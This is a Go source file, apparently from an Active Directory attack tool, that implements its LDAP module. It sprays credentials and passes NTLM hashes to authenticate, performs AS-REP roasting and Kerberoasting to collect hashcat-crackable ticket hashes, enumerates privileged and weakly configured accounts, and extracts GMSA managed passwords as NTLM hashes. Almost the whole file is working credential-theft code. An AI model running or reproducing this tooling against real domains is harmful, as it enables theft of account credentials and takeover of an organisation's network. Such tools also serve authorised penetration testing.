package optldap

import (
	"fmt"
	"strings"
	"sync"

	"github.com/5amu/goad/internal/printer"
	"github.com/5amu/goad/internal/utils"
	"github.com/5amu/goad/pkg/kerberos"
	"github.com/5amu/goad/pkg/mstypes"
	"github.com/5amu/goad/pkg/smb"
	"github.com/go-ldap/ldap/v3"
)

type Options struct {
	Targets struct {
		TARGETS []string `description:"Provide target IP/FQDN/FILE"`
	} `positional-args:"yes"`

	CustomQuery struct {
		SearchFilter string `short:"f" long:"filter" description:"Bring your own filter"`
		Attributes   string `short:"a" long:"attributes" description:"Ask your attributes (comma separated)"`
	}

	Connection struct {
		Username    string `short:"u" description:"Provide username (or FILE)"`
		Password    string `short:"p" description:"Provide password (or FILE)"`
		NullSession bool   `long:"null-session" description:"authenticate with null credentials"`
		NTLM        string `short:"H" long:"hashes" description:"Authenticate with NTLM hash"`
		Domain      string `short:"d" long:"domain" description:"Provide domain"`
		Port        int    `long:"port" default:"389" description:"Ldap port to contact"`
		SSL         bool   `short:"s" long:"ssl" description:"Use ssl to interact with ldap"`
	} `group:"Connection Options" description:"Connection Options"`

	Hashes struct {
		AsrepRoast string `long:"asreproast" description:"Grab AS_REP ticket(s) parsed to be cracked with hashcat"`
		Kerberoast string `long:"kerberoast" description:"Grab TGS ticket(s) parsed to be cracked with hashcat"`
	} `group:"Hash Retrieval Options" description:"Hash Retrieval Options"`

	Enum struct {
		TrustedForDelegation bool   `long:"trusted-for-delegation" description:"Get the list of users and computers with flag TRUSTED_FOR_DELEGATION"`
		PasswordNotRequired  bool   `long:"password-not-required" description:"Get the list of users with flag PASSWD_NOTREQD"`
		PasswordNeverExpires bool   `long:"password-never-expires" description:"Get the list of accounts with flag DONT_EXPIRE_PASSWD"`
		AdminCount           bool   `long:"admin-count" description:"Get objets that had the value adminCount=1"`
		Users                bool   `long:"users" description:"Enumerate enabled domain users"`
		User                 string `long:"user" description:"Find data about a single user"`
		Computers            bool   `long:"computers" description:"Enumerate computers in the domain"`
		ActiveUsers          bool   `long:"active-users" description:"Enumerate active enabled domain users"`
		Groups               bool   `long:"groups" description:"Enumerate domain groups"`
		DCList               bool   `long:"dc-list" description:"Enumerate Domain Controllers"`
		GetSID               bool   `long:"get-sid" description:"Get domain sid"`
		GMSA                 bool   `long:"gmsa" description:"Enumerate GMSA passwords"`
	} `group:"Enumeration Options" description:"Enumeration Options"`

	/*
		BH struct {
			Bloodhound           string   `long:"bloodhound" description:"Run bloodhound collector (v4.2) and save in output file (zip)"`
			BloodhoundNameserver string   `short:"n" long:"nameserver" description:"Provide a nameserver for bloodhound collector"`
			Collection           []string `short:"c" long:"collection" default:"Default" description:"Which information to collect. Supported: Group, LocalAdmin, Session, Trusts, Default, DCOnly, DCOM, RDP, PSRemote, LoggedOn, Container, ObjectProps, ACL, All"`
		} `group:"Run Bloodhound Collector v4.2" description:"Run Bloodhound Collector v4.2"`
	*/

	target2SMBInfo map[string]*smb.SMBInfo
	filters        []string
	filter         string
	attributes     []string
	printMutex     sync.Mutex
	credentials    []utils.Credential
}

type ExecutionFunction int

const (
	Undefined ExecutionFunction = iota
	Enumeration
	Kerberoast
	Asreproast
)

func (o *Options) getFunction() ExecutionFunction {
	if o.Hashes.AsrepRoast != "" {
		o.filter = JoinFilters(
			FilterIsUser,
			UACFilter(DONT_REQ_PREAUTH),
		)
		return Asreproast
	}

	if o.Hashes.Kerberoast != "" {
		o.filter = JoinFilters(
			FilterIsUser,
			NegativeFilter(UACFilter(ACCOUNTDISABLE)),
		)
		return Kerberoast
	}

	var function ExecutionFunction = Undefined

	if o.Enum.GetSID {
		o.filters = []string{UACFilter(SERVER_TRUST_ACCOUNT)}
		o.attributes = []string{ObjectSid}
		return Enumeration
	}

	if o.Enum.GMSA {
		o.filters = []string{FilterGMSA}
		o.attributes = []string{SAMAccountName, ManagedPassword}
		return Enumeration
	}

	if o.Enum.TrustedForDelegation {
		o.filters = append(
			o.filters,
			FilterIsUser,
			NegativeFilter(UACFilter(ACCOUNTDISABLE)),
			UACFilter(TRUSTED_FOR_DELEGATION),
		)
		function = Enumeration
	}

	if o.Enum.PasswordNotRequired {
		o.filters = append(
			o.filters,
			FilterIsUser,
			NegativeFilter(UACFilter(ACCOUNTDISABLE)),
			UACFilter(PASSWD_NOTREQD),
		)
		function = Enumeration
	}

	if o.Enum.Users {
		o.filters = append(o.filters, FilterIsUser)
		function = Enumeration
	}

	if o.Enum.Computers {
		o.filters = append(o.filters, FilterIsComputer)
		function = Enumeration
	}

	if o.Enum.User != "" {
		o.filters = append(
			o.filters,
			FilterIsUser,
			NewFilter(SAMAccountName, o.Enum.User),
		)
		function = Enumeration
	}

	if o.Enum.ActiveUsers {
		o.filters = append(
			o.filters,
			FilterIsUser,
			NegativeFilter(UACFilter(ACCOUNTDISABLE)),
		)
		function = Enumeration
	}

	if o.Enum.Groups {
		o.filters = append(o.filters, FilterIsGroup)
		function = Enumeration
	}

	if o.Enum.DCList {
		o.filters = append(
			o.filters,
			FilterIsComputer,
			NegativeFilter(UACFilter(ACCOUNTDISABLE)),
			UACFilter(SERVER_TRUST_ACCOUNT),
		)
		function = Enumeration
	}

	if o.Enum.PasswordNeverExpires {
		o.filters = append(
			o.filters,
			FilterIsUser,
			NegativeFilter(UACFilter(ACCOUNTDISABLE)),
			UACFilter(DONT_EXPIRE_PASSWORD),
		)
		function = Enumeration
	}

	if o.Enum.AdminCount {
		o.filters = append(
			o.filters,
			FilterIsUser,
			NegativeFilter(UACFilter(ACCOUNTDISABLE)),
			FilterIsAdmin,
		)
		function = Enumeration
	}

	if o.CustomQuery.SearchFilter != "" {
		o.filters = append(
			o.filters,
			o.CustomQuery.SearchFilter,
		)
		function = Enumeration
	}
	return function
}

func (o *Options) parallelExecution(runner func(string)) {
	o.filter = JoinFilters(o.filters...)
	var wg sync.WaitGroup
	for target := range o.target2SMBInfo {
		wg.Add(1)
		go func(t string) {
			if IsLDAP(t, o.Connection.Port) {
				runner(t)
			}
			wg.Done()
		}(target)
	}
	wg.Wait()
}

func (o *Options) Run() (err error) {
	o.target2SMBInfo = utils.GatherSMBInfoToMap(
		utils.ExtractTargets(o.Targets.TARGETS),
		o.Connection.Port,
	)

	if !o.Connection.NullSession {
		o.credentials = utils.NewCredentialsDispacher(
			o.Connection.Username,
			o.Connection.Password,
			o.Connection.NTLM,
			utils.Clusterbomb,
		)
	}

	tmp := strings.Split(o.CustomQuery.Attributes, ",")
	for _, a := range tmp {
		switch strings.ToLower(a) {
		case strings.ToLower(SAMAccountName), "name":
			o.attributes = append(o.attributes, SAMAccountName)
		case strings.ToLower(ServicePrincipalName), "spn":
			o.attributes = append(o.attributes, ServicePrincipalName)
		case strings.ToLower(ObjectSid):
			o.attributes = append(o.attributes, ObjectSid)
		case strings.ToLower(AdminCount):
			o.attributes = append(o.attributes, AdminCount)
		case strings.ToLower(DistinguishedName), "dn":
			o.attributes = append(o.attributes, DistinguishedName)
		case strings.ToLower(OperatingSystem):
			o.attributes = append(o.attributes, OperatingSystem)
		case strings.ToLower(OperatingSystemServicePack):
			o.attributes = append(o.attributes, OperatingSystemServicePack)
		case strings.ToLower(OperatingSystemVersion):
			o.attributes = append(o.attributes, OperatingSystemVersion)
		case strings.ToLower(PasswordLastSet):
			o.attributes = append(o.attributes, PasswordLastSet)
		case strings.ToLower(LastLogon):
			o.attributes = append(o.attributes, LastLogon)
		case strings.ToLower(MemberOf):
			o.attributes = append(o.attributes, MemberOf)
		case strings.ToLower(Description):
			o.attributes = append(o.attributes, Description)
		case strings.ToLower(ManagedPassword):
			o.attributes = append(o.attributes, ManagedPassword)
		case "":
			o.attributes = []string{SAMAccountName, Description}
		default:
			o.attributes = append(o.attributes, a)
		}
	}

	switch o.getFunction() {
	case Asreproast:
		o.parallelExecution(o.asreproast)
	case Kerberoast:
		o.parallelExecution(o.kerberoast)
	case Enumeration:
		o.parallelExecution(o.enumeration)
	case Undefined:
		o.parallelExecution(func(s string) {
			_, _, _ = o.authenticate(s)
		})
	default:
		return nil
	}
	return nil
}

func (o *Options) authenticate(target string) (*ldap.Conn, utils.Credential, error) {
	if !o.Connection.NullSession && len(o.credentials) == 0 {
		return nil, utils.Credential{}, fmt.Errorf("no credentials provided")
	}

	lconn, err := connect(target, o.Connection.Port, o.Connection.SSL)
	if err != nil {
		return nil, utils.Credential{}, err
	}

	prt := printer.NewPrinter("LDAP", target, o.target2SMBInfo[target].NetBIOSName, o.Connection.Port)
	defer prt.PrintStored(&o.printMutex)

	if o.Connection.NullSession {
		if err := lconn.UnauthenticatedBind(""); err != nil {
			prt.StoreFailure("null session not allowed")
			return nil, utils.Credential{}, fmt.Errorf("no valid authentication")
		}
		c := utils.Credential{Username: o.Connection.Username, Password: o.Connection.Password}
		prt.StoreSuccess(c.StringWithDomain(o.Connection.Domain))
		return lconn, c, nil
	}

	for _, creds := range o.credentials {
		if creds.Hash != "" {
			if err := lconn.NTLMBindWithHash(o.Connection.Domain, creds.Username, creds.Hash); err != nil {
				prt.StoreFailure(creds.StringWithDomain(o.Connection.Domain))
			} else {
				prt.StoreSuccess(creds.StringWithDomain(o.Connection.Domain))
				return lconn, creds, nil
			}
		} else {
			if err := authenticate(lconn, o.Connection.Domain, creds.Username, creds.Password); err != nil {
				prt.StoreFailure(creds.StringWithDomain(o.Connection.Domain))
			} else {
				prt.StoreSuccess(creds.StringWithDomain(o.Connection.Domain))
				return lconn, creds, nil
			}
		}
	}
	return nil, utils.Credential{}, fmt.Errorf("no valid authentication")
}

func (o *Options) asreproast(target string) {
	prt := printer.NewPrinter("LDAP", target, o.target2SMBInfo[target].NetBIOSName, o.Connection.Port)
	defer prt.PrintStored(&o.printMutex)

	lclient, creds, err := o.authenticate(target)
	if err != nil {
		prt.StoreFailure(err.Error())
		return
	}
	defer lclient.Close()

	krb5client, err := kerberos.NewKerberosClient(o.Connection.Domain, target)
	if err != nil {
		prt.StoreFailure(err.Error())
		return
	}

	krb5client.AuthenticateWithPassword(creds.Username, creds.Password)

	var hashes []string
	err = FindObjectsWithCallback(lclient, o.Connection.Domain, o.filter, func(m map[string]interface{}) error {
		samaccountname, ok := m[SAMAccountName]
		if !ok {
			return nil
		}
		name := UnpackToString(samaccountname)
		asrep, err := krb5client.GetAsReqTgt(name)
		if err != nil {
			return err
		}
		hash := kerberos.ASREPToHashcat(*asrep.Ticket)
		prt.Store(name, fmt.Sprintf("%s...%s", hash[:30], hash[len(hash)-10:]))
		hashes = append(hashes, hash)
		return nil
	}, SAMAccountName)

	if err != nil {
		prt.StoreFailure(err.Error())
		return
	}

	if len(hashes) == 0 {
		return
	}

	prt.Store("Saving hashes to", o.Hashes.AsrepRoast)
	err = utils.WriteLines(hashes, o.Hashes.AsrepRoast)
	if err != nil {
		prt.StoreFailure(err.Error())
		return
	}
}

func (o *Options) kerberoast(target string) {
	prt := printer.NewPrinter("LDAP", target, o.target2SMBInfo[target].NetBIOSName, o.Connection.Port)
	defer prt.PrintStored(&o.printMutex)

	lclient, creds, err := o.authenticate(target)
	if err != nil {
		prt.StoreFailure(err.Error())
		return
	}
	defer lclient.Close()

	krb5client, err := kerberos.NewKerberosClient(o.Connection.Domain, target)
	if err != nil {
		prt.StoreFailure(err.Error())
		return
	}

	krb5client.AuthenticateWithPassword(creds.Username, creds.Password)

	var hashes []string
	err = FindObjectsWithCallback(lclient, o.Connection.Domain, o.filter, func(m map[string]interface{}) error {
		if len(m) == 0 {
			return nil
		}

		spnsToUnpack, ok := m[ServicePrincipalName]
		if !ok {
			return nil
		}
		spns := UnpackToSlice(spnsToUnpack)

		for i, spn := range spns {
			samaccountname, ok := m[SAMAccountName]
			if !ok {
				break
			}
			name := UnpackToString(samaccountname)

			tgs, err := krb5client.GetServiceTicket(name, spn)
			if err != nil {
				return err
			}

			hash := kerberos.TGSToHashcat(tgs.Ticket, name)
			prt.Store(name, fmt.Sprintf("%s...%s", hash[:30], hash[len(hash)-10:]))

			if i == 0 {
				hashes = append(hashes, hash)
			}
		}
		return nil

	}, SAMAccountName, ServicePrincipalName)
	if err != nil {
		prt.StoreFailure(err.Error())
		return
	}

	if len(hashes) == 0 {
		return
	}

	prt.Store("Saving hashes to", o.Hashes.Kerberoast)
	err = utils.WriteLines(hashes, o.Hashes.Kerberoast)
	if err != nil {
		prt.StoreFailure(err.Error())
	}
}

func (o *Options) enumeration(target string) {
	prt := printer.NewPrinter("LDAP", target, o.target2SMBInfo[target].NetBIOSName, o.Connection.Port)
	defer prt.PrintStored(&o.printMutex)

	lclient, _, err := o.authenticate(target)
	if err != nil {
		prt.StoreFailure(err.Error())
		return
	}
	defer lclient.Close()

	if o.filter == "" {
		return
	}

	err = FindObjectsWithCallback(lclient, o.Connection.Domain, o.filter, func(m map[string]interface{}) error {
		var data []string
		for _, a := range o.attributes {
			switch a {
			case LastLogon, PasswordLastSet:
				data = append(data, DecodeADTimestamp(UnpackToString(m[a])))
			case ObjectSid:
				data = append(data, DecodeSID(UnpackToString(m[a])))
			case ManagedPassword:
				d := UnpackToString(m[ManagedPassword])
				blob := mstypes.NewMSDSManagedPasswordBlob([]byte(d))
				data = append(data, mstypes.HashDataNTLM(blob.CurrentPassword))
			default:
				data = append(data, UnpackToString(m[a]))
			}
		}
		prt.Store(data...)
		return nil
	}, o.attributes...)
	if err != nil {
		prt.StoreFailure(err.Error())
		return
	}
}
